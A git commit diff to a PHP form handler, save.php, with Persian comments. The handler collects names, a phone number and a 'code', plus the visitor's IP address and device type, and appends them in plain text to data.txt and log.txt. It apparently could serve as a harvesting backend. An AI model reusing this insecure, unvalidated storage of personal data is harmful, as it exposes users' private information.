25fae0c2c63003825783ef641a4678510de6472e
kiank0277-ops <kiank0277@gmail.com>
2025-11-24 19:59:13 +0330

    Update save.php

--- save.php
+++ save.php
@@ -1,5 +1,5 @@
 <?php
-
+// تابع برای تشخیص نوع دستگاه
 function deviceType() {
     $agent = $_SERVER['HTTP_USER_AGENT'];
     if (preg_match('/mobile/i', $agent)) {
@@ -9,22 +9,27 @@ function deviceType() {
     }
 }
 
+// دریافت داده‌ها از فرم
 $name = $_POST['name'] ?? '';
-$lastname = $_POST['lastname'] ?? '';
+$family = $_POST['family'] ?? '';  // ← باید با name فرم هماهنگ باشه
 $phone = $_POST['phone'] ?? '';
 $code = $_POST['code'] ?? '';
 
-$time = date("Y-m-d H:i:s");
+// اطلاعات دستگاه و آی‌پی
 $device = deviceType();
-$ip = $_SERVER['REMOTE_ADDR']; // آی‌پی کاربر
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date("Y-m-d H:i:s");
 
 // ذخیره در data.txt
-$data = "نام: $name | نام خانوادگی: $lastname | شماره: $phone | کد: $code | دستگاه: $device | زمان: $time\n";
+$data = "نام: $name | نام خانوادگی: $family | شماره: $phone | کد: $code | دستگاه: $device | زمان: $time\n";
 file_put_contents("data.txt", $data, FILE_APPEND);
 
 // ذخیره در log.txt
-$log = "نام: $name | نام خانوادگی: $lastname | شماره: $phone | کد: $code | دستگاه: $device | آی‌پی: $ip | زمان: $time\n";
+$log = "نام: $name | نام خانوادگی: $family | شماره: $phone | کد: $code | دستگاه: $device | آی‌پی: $ip | زمان: $time\n";
 file_put_contents("log.txt", $log, FILE_APPEND);
 
+// پاسخ کوتاه برای تایید ذخیره
 echo "saved";
 ?>
+
+
